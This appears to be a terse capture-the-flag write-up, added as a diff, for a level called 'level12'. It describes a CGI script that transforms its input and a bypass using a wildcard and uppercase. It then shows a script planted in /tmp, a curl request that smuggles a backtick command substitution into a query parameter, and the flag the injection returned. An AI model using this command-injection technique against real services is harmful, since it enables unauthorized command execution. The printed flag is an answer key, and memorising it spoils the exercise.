@@ -1,0 +1,12 @@
+Inspect file level12
+- CGI
+- Transform the input before exe
+
+Bypass
+- using wildcard and MAJ
+- echo "getflag > /tmp/flag" > /tmp/EXPLOIT
+- chmod +x /tmp/EXPLOIT
+
+Request
+- curl 'localhost:4646/?x=`/*/EXPLOIT`'
+-> g1qKMiRpXf53AWhDaU7FEkczr
